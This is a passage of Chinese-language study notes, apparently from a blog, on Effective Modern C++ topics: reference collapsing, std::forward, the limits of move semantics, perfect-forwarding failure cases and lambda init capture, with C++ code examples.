class="hljs-keyword">typename</span> remove_reference&lt;T&gt;::type&amp; param)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;T&amp;&amp;&gt;(param);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在C++14中，<code>std::remove_reference_t</code>的存在使得实现变得更简洁：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                        <span class="hljs-comment">//C++14；仍然在std命名空间</span><br><span class="hljs-function">T&amp;&amp; <span class="hljs-title">forward</span><span class="hljs-params">(<span class="hljs-keyword">remove_reference_t</span>&lt;T&gt;&amp; param)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;T&amp;&amp;&gt;(param);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>假设传入到<code>f</code>的实参是<code>Widget</code>的左值类型。<code>T</code>被推导为<code>Widget&amp;</code>，然后调用<code>std::forward</code>将实例化为<code>std::forward&lt;Widget&amp;&gt;</code>。</p><p><code>Widget&amp;</code>带入到上面的<code>std::forward</code>的实现中：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget&amp; &amp;&amp; <span class="hljs-title">forward</span><span class="hljs-params">(<span class="hljs-keyword">typename</span> </span></span><br><span class="hljs-function"><span class="hljs-params">                       remove_reference&lt;Widget&amp;&gt;::type&amp; param)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;Widget&amp; &amp;&amp;&gt;(param); &#125;<br></code></pre></div></td></tr></table></figure><p><code>std::remove_reference&lt;Widget&amp;&gt;::type</code>这个<em>typetrait</em>产生<code>Widget</code>，所以<code>std::forward</code>成为：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget&amp; &amp;&amp; <span class="hljs-title">forward</span><span class="hljs-params">(Widget&amp; param)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;Widget&amp; &amp;&amp;&gt;(param); &#125;<br></code></pre></div></td></tr></table></figure><p>根据引用折叠规则，返回值和强制转换可以化简，最终版本的<code>std::forward</code>调用就是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget&amp; <span class="hljs-title">forward</span><span class="hljs-params">(Widget&amp; param)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;Widget&amp;&gt;(param); &#125;<br></code></pre></div></td></tr></table></figure><p>当左值实参被传入到函数模板<code>f</code>时，<code>std::forward</code>被实例化为接受和返回左值引用。</p><p>如果传入右值，那么结果会是这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget&amp;&amp; <span class="hljs-title">forward</span><span class="hljs-params">(Widget&amp; param)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;Widget&amp;&amp;&gt;(param); &#125;<br></code></pre></div></td></tr></table></figure><h3><span id="auto">auto</span></h3><p>在auto的写法中，规则是类似的。声明</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span>&amp;&amp; w1 = w;<br></code></pre></div></td></tr></table></figure><p>用一个左值初始化<code>w1</code>，因此为<code>auto</code>推导出类型<code>Widget&amp;</code>。把<code>Widget&amp;</code>代回<code>w1</code>声明中的<code>auto</code>里，产生了引用的引用，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget&amp; &amp;&amp; w1 = w;<br></code></pre></div></td></tr></table></figure><p>应用引用折叠规则，就是</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget&amp; w1 = w<br></code></pre></div></td></tr></table></figure><p>结果就是<code>w1</code>是一个左值引用。</p><p>下面这个声明，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span>&amp;&amp; w2 = widgetFactory();<br></code></pre></div></td></tr></table></figure><p>使用右值初始化<code>w2</code>，为<code>auto</code>推导出非引用类型<code>Widget</code>。把<code>Widget</code>代入<code>auto</code>得到：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget&amp;&amp; w2 = widgetFactory()<br></code></pre></div></td></tr></table></figure><p>没有引用的引用，这就是最终结果，<code>w2</code>是个右值引用。</p><h3><span id="通用引用">通用引用</span></h3><p>通用引用不是一种新的引用，它实际上是满足以下两个条件下的右值引用：</p><ul><li><strong>类型推导区分左值和右值</strong>。<code>T</code>类型的左值被推导为<code>T&amp;</code>类型，<code>T</code>类型的右值被推导为<code>T</code>。</li><li><strong>发生引用折叠</strong>。</li></ul><h3><span id="结论">结论</span></h3><ul><li>引用折叠发生在四种情况下：模板实例化，<code>auto</code>类型推导，<code>typedef</code>与别名声明的创建和使用，<code>decltype</code>。</li><li>当编译器在引用折叠环境中生成了引用的引用时，结果就是单个引用。带有左值引用的引用折叠，结果就是左值引用。否则就是右值引用。</li><li>通用引用就是引用折叠的结果。</li></ul><h2><span id="29-移动操作的缺点">29 移动操作的缺点</span></h2><h3><span id="升级c11之前的代码">升级C++11之前的代码</span></h3><p>C++11倾向于为缺少移动操作的类生成它们，但是只有在<strong>没有声明复制操作，移动操作，析构函数的类</strong>中才会生成移动操作。</p><p>另外数据成员或者某类型的基类禁止移动操作，编译器不生成移动操作的支持。</p><p>所以，对于没有明确支持移动操作的类型，并且不符合编译器默认生成的条件的类，没有理由期望C++11会比C++98进行任何性能上的提升。</p><h3><span id="移动大对象">移动大对象</span></h3><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Widget&gt; vm1;<br><br><span class="hljs-comment">//把数据存进vw1</span><br>…<br><br><span class="hljs-comment">//把vw1移动到vw2。以常数时间运行。只有vw1和vw2中的指针被改变</span><br><span class="hljs-keyword">auto</span> vm2 = <span class="hljs-built_in">std</span>::move(vm1);<br></code></pre></div></td></tr></table></figure><p><code>std::array</code>没有这种指针实现，数据就保存在<code>std::array</code>对象中：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;Widget, 10000&gt; aw1;<br><br><span class="hljs-comment">//把数据存进aw1</span><br>…<br><br><span class="hljs-comment">//把aw1移动到aw2。以线性时间运行。aw1中所有元素被移动到aw2</span><br><span class="hljs-keyword">auto</span> aw2 = <span class="hljs-built_in">std</span>::move(aw1);<br></code></pre></div></td></tr></table></figure><p>移动还是遍历了所有元素。</p><h3><span id="移动小字符串">移动小字符串</span></h3><p><code>std::string</code>提供了常数时间的移动操作和线性时间的复制操作。</p><p>许多字符串的实现采用了小字符串优化（<em>small stringoptimization</em>，SSO）。“小”字符串（比如长度小于15个字符的）存储在了<code>std::string</code>的缓冲区中，并没有存储在堆内存，移动这种存储的字符串并不比复制操作更快（并不会执行指针的复制，而是将字符串完全从一个位置拷贝到另一个位置，再清空原来的内存）。</p><h3><span id="结论">结论</span></h3><p>C++11的移动语义并无优势：</p><ul><li><p><strong>没有移动操作</strong>：要移动的对象没有提供移动操作，所以移动的写法也会变成复制操作。</p></li><li><p><strong>移动不会更快</strong>：要移动的对象提供的移动操作并不比复制速度更快。</p></li><li><p><strong>移动不可用</strong>：进行移动的上下文要求移动操作不会抛出异常，但是该操作没有被声明为<code>noexcept</code>。</p></li><li><p><strong>源对象是左值</strong>：除了极少数的情况外，只有右值可以作为移动操作的来源。</p></li></ul><h2><span id="30-完美转发失败的情况">30 完美转发失败的情况</span></h2><p><strong>完美转发</strong>（<em>perfectforwarding</em>）意味着我们不仅转发对象，我们还转发显著的特征：它们的类型，是左值还是右值，是<code>const</code>还是<code>volatile</code>。</p><p>有以下函数：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Ts&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fwd</span><span class="hljs-params">(Ts&amp;&amp;... params)</span>            <span class="hljs-comment">//接受任何实参</span></span><br><span class="hljs-function"></span>&#123;<br>    f(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...); <span class="hljs-comment">//转发给f</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>讨论下面函数调用失败的情况：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">f( expression );        <span class="hljs-comment">//调用f执行某个操作</span><br>fwd( expression );<span class="hljs-comment">//但调用fwd执行另一个操作，则fwd不能完美转发expression给f</span><br></code></pre></div></td></tr></table></figure><h3><span id="花括号初始化器">花括号初始化器</span></h3><p>假定<code>f</code>这样声明：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;&amp; v)</span></span>;<br></code></pre></div></td></tr></table></figure><p>在这个例子中，用花括号初始化调用<code>f</code>通过编译，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">f(&#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;);         <span class="hljs-comment">//可以，“&#123;1, 2, 3&#125;”隐式转换为std::vector&lt;int&gt;</span><br></code></pre></div></td></tr></table></figure><p>但是传递相同的列表初始化给fwd不能编译</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">fwd(&#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;);       <span class="hljs-comment">//错误！不能编译</span><br></code></pre></div></td></tr></table></figure><p>当通过调用函数模板<code>fwd</code>间接调用<code>f</code>时，编译器不再把调用地传入给<code>fwd</code>的实参和<code>f</code>的声明中形参类型进行比较。</p><p>而是<strong>推导</strong>传入给<code>fwd</code>的实参类型，然后比较推导后的实参类型和<code>f</code>的形参声明类型。</p><p>编译器不允许在对<code>fwd</code>的调用中推导表达式<code>{ 1, 2, 3 }</code>的类型，因为<code>fwd</code>的形参没有声明为<code>std::initializer_list</code>。对于<code>fwd</code>形参的推导类型被阻止，编译器只能拒绝该调用。</p><p>但是，使用花括号初始化的<code>auto</code>的变量的类型推导是成功的。这种变量被视为<code>std::initializer_list</code>对象，在转发函数应推导出类型为<code>std::initializer_list</code>的情况，这提供了一种简单的解决方法——使用<code>auto</code>声明一个局部变量，然后将局部变量传进转发函数：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> il = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span> &#125;;  <span class="hljs-comment">//il的类型被推导为std::initializer_list&lt;int&gt;</span><br>fwd(il);                <span class="hljs-comment">//可以，完美转发il给f</span><br></code></pre></div></td></tr></table></figure><h3><span id="0或者null"><code>0</code>或者<code>NULL</code></span></h3><p>当你试图传递<code>0</code>或者<code>NULL</code>作为空指针给模板时，类型推导会出错，会把传来的实参推导为一个整型类型（典型情况为<code>int</code>）而不是指针类型。结果就是不管是<code>0</code>还是<code>NULL</code>都不能作为空指针被完美转发。解决方法非常简单，传一个<code>nullptr</code>而不是<code>0</code>或者<code>NULL</code>。</p><h3><span id="只有声明的-static-const数据成员">只有声明的 static const数据成员</span></h3><p>下面的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> MinVals = <span class="hljs-number">28</span>;  <span class="hljs-comment">//MinVal的声明</span><br>    …<br>&#125;;<br>…                                           <span class="hljs-comment">//没有MinVals定义</span><br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; widgetData;<br>widgetData.reserve(Widget::MinVals);        <span class="hljs-comment">//使用MinVals</span><br></code></pre></div></td></tr></table></figure><p>使用<code>MinVals</code>调用<code>f</code>是可以的，因为编译器直接将值28代替<code>MinVals</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">f(Widget::MinVals);         <span class="hljs-comment">//可以，视为“f(28)”</span><br></code></pre></div></td></tr></table></figure><p>不过如果我们尝试通过<code>fwd</code>调用<code>f</code>，事情不会进展那么顺利：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">fwd(Widget::MinVals);       <span class="hljs-comment">//错误！</span><br></code></pre></div></td></tr></table></figure><p>代码可以编译，但是不应该链接。</p><p>尽管代码中没有使用<code>MinVals</code>的地址，但是<code>fwd</code>的形参是通用引用。</p><p>而引用，在编译器生成的代码中，通常被视作指针。</p><p>在程序的二进制底层代码中（以及硬件中）指针和引用是一样的。在这个水平上，引用只是可以自动解引用的指针。在这种情况下，通过引用传递<code>MinVals</code>实际上与通过指针传递<code>MinVals</code>是一样的，因此，必须有内存使得指针可以指向。</p><p>链接时，链接不到内存，就会报错。</p><p>只要给整型<code>static const</code>提供一个定义，就可以解决问题了，比如这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> Widget::MinVals;  <span class="hljs-comment">//在Widget的.cpp文件</span><br></code></pre></div></td></tr></table></figure><p>注意定义中不要重复初始化。如果在两个地方都提供了初始化，编译器就会报错，提醒你只能初始化一次。</p><h3><span id="重载函数的名称和模板名称">重载函数的名称和模板名称</span></h3><p>假设有了一个重载函数，<code>processVal</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> (*pf)(<span class="hljs-keyword">int</span>))</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">processVal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">processVal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value, <span class="hljs-keyword">int</span> priority)</span></span>;<br></code></pre></div></td></tr></table></figure><p>传递给 <code>f</code>是没问题的，因为编译器是可以基于现有信息判断调用哪一个重载函数的。</p><p>但是，<code>fwd(processVal);</code> 不行。单用<code>processVal</code>是没有类型信息的，所以就不能类型推导，完美转发失败。</p><p>需要这样使用：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> ProcessFuncType = <span class="hljs-keyword">int</span> (*)(<span class="hljs-keyword">int</span>);<br><br>ProcessFuncType processValPtr = processVal;     <span class="hljs-comment">//指定所需的processVal签名</span><br><br>fwd(processValPtr);                             <span class="hljs-comment">//可以</span><br>fwd(<span class="hljs-keyword">static_cast</span>&lt;ProcessFuncType&gt;(workOnVal));   <span class="hljs-comment">//也可以</span><br></code></pre></div></td></tr></table></figure><p>对于模板，有相似的问题。一个函数模板不代表单独一个函数，它表示一个函数族：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function">T <span class="hljs-title">workOnVal</span><span class="hljs-params">(T param)</span>                <span class="hljs-comment">//处理值的模板</span></span><br><span class="hljs-function"></span>&#123; … &#125;<br><br>fwd(workOnVal);                     <span class="hljs-comment">//错误！哪个workOnVal实例？</span><br></code></pre></div></td></tr></table></figure><p>要让像<code>fwd</code>的完美转发函数接受一个重载函数名或者模板名，方法是指定要转发的那个重载或者实例。</p><h3><span id="位域">位域</span></h3><p>IPv4的头部有如下模型：（假定位域是按从最低有效位（<em>leastsignificant bit</em>，lsb）到最高有效位（<em>most significantbit</em>，msb）</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IPv4Header</span> &#123;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-keyword">uint32_t</span> version:<span class="hljs-number">4</span>,<br>                  IHL:<span class="hljs-number">4</span>,<br>                  DSCP:<span class="hljs-number">6</span>,<br>                  ECN:<span class="hljs-number">2</span>,<br>                  totalLength:<span class="hljs-number">16</span>;<br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>如果声明我们的函数<code>f</code>（转发函数<code>fwd</code>的目标）为接收一个<code>std::size_t</code>的形参，则使用<code>IPv4Header</code>对象的<code>totalLength</code>字段进行调用没有问题：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> sz)</span></span>;         <span class="hljs-comment">//要调用的函数</span><br><br>IPv4Header h;<br>…<br>f(h.totalLength);               <span class="hljs-comment">//可以</span><br></code></pre></div></td></tr></table></figure><p>如果通过<code>fwd</code>转发<code>h.totalLength</code>给<code>f</code>呢，那就是一个不同的情况了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">fwd(h.totalLength);             <span class="hljs-comment">//错误！</span><br></code></pre></div></td></tr></table></figure><p>问题在于<code>fwd</code>的形参是引用，而<code>h.totalLength</code>是non-<code>const</code>位域，这是C++不允许的行为。</p><p>位域可能包含了一个字的任意部分（比如32位<code>int</code>的3-5位），但是这些东西无法直接寻址。在硬件层面引用和指针是一样的，所以没有办法创建一个指向任意<em>bit</em>的指针。</p><p>传递位域给完美转发的方法就是，创建副本然后利用副本调用完美转发。在<code>IPv4Header</code>的例子中，可以如下写法：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//拷贝位域值</span><br><span class="hljs-keyword">auto</span> length = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-keyword">uint16_t</span>&gt;(h.totalLength);<br><br>fwd(length);                    <span class="hljs-comment">//转发这个副本</span><br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>导致完美转发失败的实参种类有：花括号初始化，作为空指针的<code>0</code>或者<code>NULL</code>，仅有声明的<code>static const</code>数据成员，模板和重载函数的名字，位域。</li></ul><h2><span id="30-lambda-表达式">30 Lambda 表达式</span></h2><p><strong>闭包</strong>（<em>enclosure</em>）是<em>lambda</em>创建的运行时对象。依赖捕获模式，闭包持有被捕获数据的副本或者引用。</p><p><strong>闭包类</strong>（<em>closureclass</em>）是从中实例化闭包的类。每个<em>lambda</em>都会使编译器生成唯一的闭包类。<em>lambda</em>中的语句成为其闭包类的成员函数中的可执行指令。</p><p><em>lambda</em>通常被用来创建闭包，该闭包仅用作函数的实参。闭包通常可以拷贝，所以可能有多个闭包对应于一个<em>lambda</em>。</p><p>但是对于闭包，需要明白的一点是：区分什么存在于编译期（<em>lambdas</em>和闭包类），什么存在于运行时（闭包）以及它们之间的相互关系。</p><h3><span id="避免使用默认的捕获模式">避免使用默认的捕获模式</span></h3><p>按默认引用捕获会导致闭包中包含了对某个局部变量或者形参的引用。如果该<em>lambda</em>创建的闭包生命周期超过了局部变量，那么闭包中的引用将会变成悬空引用。</p><p>另外，成员函数中，使用捕获需要明白 <code>this</code>指针的存在，直接捕获成员变量是会出错的。</p><p>一个解决方案是：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::addFilter</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> divisorCopy = divisor;                 <span class="hljs-comment">//拷贝数据成员</span><br><br>    filters.emplace_back(<br>        [divisorCopy](<span class="hljs-keyword">int</span> value)                <span class="hljs-comment">//捕获副本</span><br>        &#123; <span class="hljs-keyword">return</span> value % divisorCopy == <span class="hljs-number">0</span>; &#125;<span class="hljs-comment">//使用副本</span><br>    );<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在C++14中，一个更好的捕获成员变量的方式时使用通用的<em>lambda</em>捕获：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::addFilter</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span><br><span class="hljs-function"></span>&#123;<br>    filters.emplace_back(                   <span class="hljs-comment">//C++14：</span><br>        [divisor = divisor](<span class="hljs-keyword">int</span> value)      <span class="hljs-comment">//拷贝divisor到闭包</span><br>        &#123; <span class="hljs-keyword">return</span> value % divisor == <span class="hljs-number">0</span>; &#125;<span class="hljs-comment">//使用这个副本</span><br>    );<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果是 static 成员，那么默认捕获行为将什么也不会捕获。</p><h3><span id="结论">结论</span></h3><ul><li>默认的按引用捕获可能会导致悬空引用。</li><li>默认的按值捕获对于悬空指针很敏感（尤其是<code>this</code>指针），并且它会误导人产生<em>lambda</em>是独立的想法。</li></ul><h2><span id="31-使用-init-capture来移动对象到闭包">31 使用 init capture来移动对象到闭包</span></h2><p>在某些场景下，按值捕获和按引用捕获都不是你所想要的。如果你有一个只能被移动的对象（例如<code>std::unique_ptr</code>或<code>std::future</code>）要进入到闭包里，使用C++11是无法实现的。到了C++14就另一回事了，它能支持将对象移动到闭包中。</p><h3><span id="init-capture">init capture</span></h3><p>C++14中，这是使用初始化捕获将<code>std::unique_ptr</code>移动到闭包中的方法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                          <span class="hljs-comment">//一些有用的类型</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isValidated</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isProcessed</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isArchived</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br><span class="hljs-keyword">private</span>:<br>    …<br>&#125;;<br><br><span class="hljs-keyword">auto</span> pw = <span class="hljs-built_in">std</span>::make_unique&lt;Widget&gt;();   <span class="hljs-comment">//创建Widget；使用std::make_unique</span><br>                                        <span class="hljs-comment">//的有关信息参见条款21</span><br><br>…                                       <span class="hljs-comment">//设置*pw</span><br><br><span class="hljs-keyword">auto</span> func = [pw = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(pw)]        <span class="hljs-comment">//使用std::move(pw)初始化闭包数据成员</span><br>            &#123; <span class="hljs-keyword">return</span> pw-&gt;isValidated()<br>                     &amp;&amp; pw-&gt;isArchived(); &#125;;<br></code></pre></div></td></tr></table></figure><p>“<code>pw = 